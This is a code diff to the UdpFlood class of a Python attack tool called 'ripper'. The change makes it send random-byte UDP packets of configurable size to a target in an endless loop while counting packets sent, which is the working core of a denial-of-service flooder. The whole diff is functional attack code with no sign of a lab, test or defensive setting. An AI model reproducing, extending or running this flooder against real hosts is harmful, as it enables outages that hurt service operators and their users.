@@ -2,7 +2,7 @@ from contextlib import suppress
 from socket import socket
 from typing import Tuple, Any
 
-from ripper.attacks import build_ctx_request_http_package
+from ripper.common import generate_random_bytes
 from ripper.context import Context, Errors
 from ripper.constants import *
 
@@ -31,26 +31,27 @@ class UdpFlood:
         return conn
 
     def __call__(self, *args, **kwargs):
-        with suppress(Exception), self.create_connection() as s:
+        with suppress(Exception), self.create_connection() as udp_conn:
             self._ctx.Statistic.connect.status_success()
-            while self.sendto(s):
+            while self.sendto(udp_conn):
                 continue
 
     def sendto(self, sock: socket) -> bool:
-        request = build_ctx_request_http_package(self._ctx)
-
+        send_bytes = generate_random_bytes(
+            self._ctx.random_packet_len,
+            self._ctx.max_random_packet_len)
         try:
-            sent = sock.sendto(request, self._target)
+            sent = sock.sendto(send_bytes, self._target)
         except socket.gaierror:
             self._ctx.add_error(Errors('Send UDP packet', GETTING_SERVER_IP_ERROR_MSG))
         except Exception as e:
             self._ctx.add_error(Errors('TCP send Err', e))
-            self._ctx.sock_manager.close_udp_socket()
         else:
             self._ctx.Statistic.packets.status_sent(sent_bytes=sent)
             self._ctx.remove_error(Errors('TCP send Err', GETTING_SERVER_IP_ERROR_MSG).uuid)
             return True
 
         self._ctx.Statistic.connect.status_failed()
+        self._ctx.sock_manager.close_socket()
         return False
 
